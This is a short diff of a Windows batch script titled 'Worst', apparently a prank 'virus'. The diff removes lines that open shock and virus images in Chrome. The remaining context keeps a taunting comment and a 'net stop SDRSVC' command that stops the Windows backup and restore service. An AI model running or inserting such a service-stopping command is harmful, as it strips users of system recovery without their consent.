@@ -12,12 +12,6 @@ color 5D
 
 title Worst
 
-start chrome "https://dafunda.com/wp-content/uploads/2018/04/Mengerikan-Inilah-15-Gambar-Horor-Dan-Sadis-SpongeBob-Buatan-Netizen-10.jpg"
-start chrome "https://img.itch.zone/aW1hZ2UvMjc5NzQwLzEzOTIyMjYucG5n/original/0o5hhx.png"
-start chrome "https://lh5.googleusercontent.com/p/AF1QipPKKmI92aV4efRx4pPGRPfznlrqBL9VVbWEHdIB=w750-h401-p-k-no"
-start chrome "https://www.malwarefox.com/wp-content/uploads/2019/01/computer-worm.png"
-start chrome "https://factorialist.com/wp-content/uploads/2012/06/Computer_Virus_Cartoon_Clip_Art_091110-053144-773042.jpg"
-
 :: NOTHING WILL STOP IT NOW!
 
 net stop "SDRSVC"
